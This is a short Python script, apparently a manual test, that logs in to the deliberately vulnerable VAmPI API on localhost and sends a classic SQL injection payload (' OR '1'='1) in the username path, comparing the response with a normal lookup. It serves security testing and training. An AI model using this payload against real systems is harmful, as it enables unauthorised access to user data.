"""Manual SQL injection check against VAmPI's GET /users/v1/{username}.

Compares a normal username lookup with a classic SQLi payload that makes
the underlying WHERE clause always true.
"""

import requests

BASE_URL = "http://localhost:5000"

# 1. Log in to get a token
login = requests.post(
    f"{BASE_URL}/users/v1/login",
    json={"username": "name1", "password": "pass1"},
)
headers = {"Authorization": f"Bearer {login.json()['auth_token']}"}

# 2. A normal lookup for a username that does not exist
normal = requests.get(f"{BASE_URL}/users/v1/doesnotexist123", headers=headers)
print("Normal lookup status:", normal.status_code)
print("Normal lookup result:", normal.json())

# 3. A classic SQL injection payload in place of the username
payload = "doesnotexist123' OR '1'='1"
injected = requests.get(f"{BASE_URL}/users/v1/{payload}", headers=headers)
print("\nInjected lookup status:", injected.status_code)
print("Injected lookup result:", injected.json())